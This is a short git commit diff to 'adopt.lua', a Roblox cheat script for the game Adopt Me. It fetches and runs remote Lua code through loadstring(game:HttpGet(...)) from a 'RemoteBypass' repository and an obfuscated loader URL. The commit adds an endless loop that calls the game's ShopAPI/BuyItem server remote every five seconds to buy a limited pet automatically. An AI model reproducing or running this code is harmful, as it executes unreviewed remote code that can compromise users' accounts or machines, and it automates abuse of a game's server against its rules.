2b49075e5c466a5962a26b1282967e4302a4b149
greg66n <darien95sm@hotmail.com>
2025-02-17 10:15:45 -0800

    Update adopt.lua

--- adopt.lua
+++ adopt.lua
@@ -2,4 +2,17 @@ wait(0.1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
 wait(0.1)
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/08615e5f6a25239a4ffa9b6203728d70.lua"))()
+wait(0.1)
+local args = {
+    [1] = "pets",
+    [2] = "valentines_2025_love_bird",
+    [3] = {
+        ["buy_count"] = 2
+    }
+}
+
+while true do
+    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))
+    wait(5)  -- Wait for 5 seconds before repeating the entire cycle
+end
 
